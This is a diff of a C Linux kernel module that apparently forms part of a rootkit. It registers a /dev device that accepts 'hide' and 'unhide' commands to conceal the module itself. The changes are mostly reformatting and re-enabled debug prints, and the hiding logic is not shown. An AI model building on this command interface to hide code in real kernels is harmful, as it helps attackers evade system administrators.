@@ -46,17 +46,16 @@ static int device_release(struct inode *, struct file *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 
-static const struct file_operations file_ops = { // operations on our /dev/$filename file
-	.read = device_read,               // and their associated functions
+// operations on our /dev/$filename file
+// and their associated functions
+static const struct file_operations file_ops = {
+	.read = device_read,
 	.write = device_write,
 	.open = device_open,
 	.release = device_release
 };
 
-static ssize_t device_read(struct file *filp,
-		char *buffer,
-		size_t length,
-		loff_t *offset)
+static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
 {
 	int bytes_read = 0;
 	DEBUG_PRINT("%s: in device_read", THIS_MODULE->name);
@@ -71,7 +70,7 @@ static ssize_t device_read(struct file *filp,
 
 static void cleanup(int device_created)
 {
-	//DEBUG_PRINT("%s in cleanup", THIS_MODULE->name);
+	DEBUG_PRINT("%s in cleanup", THIS_MODULE->name);
 	if (device_created) {
 		device_destroy(myclass, major);
 		cdev_del(&mycdev);
@@ -83,11 +82,12 @@ static void cleanup(int device_created)
 }
 
 
-static void parse_command(char * cmd) {
+static void parse_command(char * cmd)
+{
 	int hide;
 	int unhide;
-	//DEBUG_PRINT("%s: in parse_command.\n", THIS_MODULE->name);
-	//DEBUG_PRINT("Command: '%s'", cmd);
+	DEBUG_PRINT("%s: in parse_command.\n", THIS_MODULE->name);
+	DEBUG_PRINT("Command: '%s'", cmd);
 	hide = strncmp(cmd, "hide\n", BUFF_LEN);
 	if (hide == 0) {
 		hide_self();
@@ -100,21 +100,20 @@ static void parse_command(char * cmd) {
 	}
 }
 
+
 // Called when a process tries to write to our device 
-static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset) {
+static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset)
+{
+	DEBUG_PRINT("%s: in device_write", THIS_MODULE->name);
+
 	int i;
-
-	//DEBUG_PRINT("%s: in device_write", THIS_MODULE->name);
-
 	for (i = 0; i < len && i < BUFF_LEN; i++)
 		get_user(cmd_str[i], buffer + i);
 
 	cmd_str[i] = 0; // null terminating byte; very important!
 	cmd_ptr = cmd_str;
 
-	/* 
-	 * Again, return the number of input characters used 
-	 */
+	// return the number of input characters used
 	parse_command(cmd_str);
 	return i;
 }
@@ -123,31 +122,35 @@ static ssize_t device_write(struct file *flip, const char *buffer, size_t len, l
 // Called when a process opens our device
 static int device_open(struct inode *inode, struct file *file)
 {
-	//DEBUG_PRINT("%s: in device_open", THIS_MODULE->name);
+	DEBUG_PRINT("%s: in device_open", THIS_MODULE->name);
 
 	// make sure only one process is using our device
 	if (device_open_count) return -EBUSY;
 
 	device_open_count++;
-	/*
-	 * Initialize the message 
-	 */
+
+	//  initialize the message 
 	cmd_ptr = cmd_str;
 	status_ptr = status_str;
 	try_module_get(THIS_MODULE);
 	return 0;
 }
 
+
 // Called when a process closes our device 
-static int device_release(struct inode *inode, struct file *file) {
-	// Decrement the open counter and usage count. Without this, the module would not unload.
-	//DEBUG_PRINT("%s: in device_release\n", THIS_MODULE->name);
+static int device_release(struct inode *inode, struct file *file)
+{
+	// decrement the open counter and usage count. Without this, the module would not unload.
+	DEBUG_PRINT("%s: in device_release\n", THIS_MODULE->name);
 	device_open_count--;
 	module_put(THIS_MODULE);
 	return 0;
 }
-static int hide_self(void) {
-	//DEBUG_PRINT("%s: in hide_self\n", THIS_MODULE->name);
+
+
+static int hide_self(void)
+{
+	DEBUG_PRINT("%s: in hide_self\n", THIS_MODULE->name);
 	if (hidden) {
 		strncpy(status_str, "Error: already hidden!\n", BUFF_LEN);
 		return -1;
@@ -159,11 +162,12 @@ static int hide_self(void) {
 	hidden = 1;
 	strncpy(status_str, "Successfully hid.\n", BUFF_LEN);
 	return 0;
-
 }
 
-static int unhide_self(void) {
-	//DEBUG_PRINT("%s: in unhide_self\n", THIS_MODULE->name);
+
+static int unhide_self(void)
+{
+	DEBUG_PRINT("%s: in unhide_self\n", THIS_MODULE->name);
 	if (hidden == 0) {
 		strncpy(status_str, "Error: already visible!\n", BUFF_LEN);
 		return -1;
@@ -176,43 +180,50 @@ static int unhide_self(void) {
 	return 0;
 }
 
-static int __init mod_init(void) {
-	int device_created = 0;
-	//DEBUG_PRINT("%s: starting up\n", THIS_MODULE->name);
-	//DEBUG_PRINT("%s: filename='%s'\n", THIS_MODULE->name, filename);
-	//DEBUG_PRINT("%s: registering device %s\n", THIS_MODULE->name, filename);
 
-	/* cat /proc/devices */
+static int __init mod_init(void)
+{
+	int device_created = 0;
+	DEBUG_PRINT("%s: starting up\n", THIS_MODULE->name);
+	DEBUG_PRINT("%s: filename='%s'\n", THIS_MODULE->name, filename);
+	DEBUG_PRINT("%s: registering device %s\n", THIS_MODULE->name, filename);
+
+	// /proc/devices
 	if (alloc_chrdev_region(&major, 0, 1, filename) < 0) {
 		goto error;
 	}
-	/* ls /sys/class */
+	// /sys/class
 	if ((myclass = class_create(THIS_MODULE, filename)) == NULL) {
 		goto error;
 	}
-	/* ls /dev/ */
+	// /dev/
 	if (device_create(myclass, NULL, major, NULL, filename) == NULL) {
 		goto error;
 	}
+
 	device_created = 1;
 	cdev_init(&mycdev, &file_ops);
+
 	if (cdev_add(&mycdev, major, 1) == -1){
 		goto error;
 	}
-	//DEBUG_PRINT("%s: succesfully registered!\n", THIS_MODULE->name);
+
+	DEBUG_PRINT("%s: succesfully registered!\n", THIS_MODULE->name);
 	snprintf(status_str, BUFF_LEN, "%s initialized and awaiting command!\n", THIS_MODULE->name);
 	return 0;
+
 error:
 #ifdef DEBUG
-	//DEBUG_PRINT("%s: failed to register device!\n", THIS_MODULE->name);
+	DEBUG_PRINT("%s: failed to register device!\n", THIS_MODULE->name);
 #endif
 	cleanup(device_created);
 	return -1;
 }
 
 
-static void __exit mod_exit(void) {
-	//DEBUG_PRINT("%s: in mod_exit\n", THIS_MODULE->name);
+static void __exit mod_exit(void)
+{
+	DEBUG_PRINT("%s: in mod_exit\n", THIS_MODULE->name);
 	cleanup(1);
 }
 
